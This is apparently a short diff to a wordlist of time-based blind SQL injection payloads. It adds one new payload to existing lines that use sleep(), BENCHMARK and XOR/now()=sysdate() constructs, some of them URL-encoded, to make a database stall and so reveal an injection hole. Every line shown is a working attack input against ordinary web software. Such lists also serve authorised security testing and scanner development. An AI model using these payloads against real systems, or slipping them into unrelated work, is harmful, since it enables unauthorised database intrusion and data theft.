@@ -38,3 +38,4 @@ if(now()=sysdate(),sleep(20),0)/'XOR(if(now()=sysdate(),sleep(20),0))OR'"XOR(if(
 %22)%20AND%201337%3dBENCHMARK(5000000,MD5(0x774c5341))%20AND%20(%221337%22%20LIKE%20%221337
 'XOR(if(now()=sysdate(),sleep(10),0))XOR'111
 (select(0)from(select(sleep(10)))v)/*'%2B(select(0)from(select(sleep(10)))v)%2B'%5C"%2B(select(0)from(select(sleep(10)))v)
+0'XOR(if(now()=sysdate(),sleep(6-2),0))XOR'Z
